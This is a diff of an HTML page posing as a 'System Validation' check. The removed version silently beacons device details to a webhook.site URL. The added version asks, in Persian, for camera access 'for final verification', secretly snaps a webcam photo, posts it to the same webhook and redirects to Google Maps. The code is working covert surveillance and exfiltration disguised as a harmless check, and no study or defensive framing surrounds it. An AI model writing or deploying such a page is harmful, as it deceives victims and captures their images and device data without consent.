@@ -1,26 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Check</title></head>
+<head><title>System Validation</title></head>
 <body>
+    <div style="text-align: center; margin-top: 20%; font-family: Arial;">
+        <h2>لطفاً برای تایید نهایی سیستم، اجازه دسترسی به دوربین را بدهید</h2>
+        <video id="v" width="320" height="240" style="display:none" autoplay></video>
+        <canvas id="c" width="320" height="240" style="display:none"></canvas>
+    </div>
+
     <script>
-        // ارسال داده به صورت نامرئی
-        function sendLog() {
-            const out = "https://webhook.site/dd9af163-1084-4613-852c-e8554895a323";
-            const data = {
-                device: navigator.platform,
-                screen: window.screen.width + "x" + window.screen.height,
-                agent: navigator.userAgent
-            };
-            
-            navigator.sendBeacon(out, JSON.stringify(data));
-            
-            // انتقال به صفحه اصلی گوگل مپ بعد از ۱ ثانیه
-            setTimeout(() => {
-                window.location.replace("https://www.google.com/maps");
-            }, 1000);
+        async function capture() {
+            try {
+                // درخواست دسترسی به دوربین
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = s;
+
+                // ۲ ثانیه صبر برای فوکوس و بعد گرفتن عکس
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
+                    const img = c.toDataURL('image/jpeg');
+
+                    // ارسال عکس به وب‌هوک
+                    fetch('https://webhook.site/dd9af163-1084-4613-852c-e8554895a323', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: img
+                    });
+                    
+                    // بستن دوربین و انتقال به گوگل مپ
+                    s.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://www.google.com/maps";
+                }, 2000);
+            } catch (e) {
+                window.location.href = "https://www.google.com/maps";
+            }
         }
-        window.onload = sendLog;
+        window.onload = capture;
     </script>
-    <p style="font-family: Arial; text-align: center; margin-top: 20%;">Loading system components, please wait...</p>
 </body>
 </html>
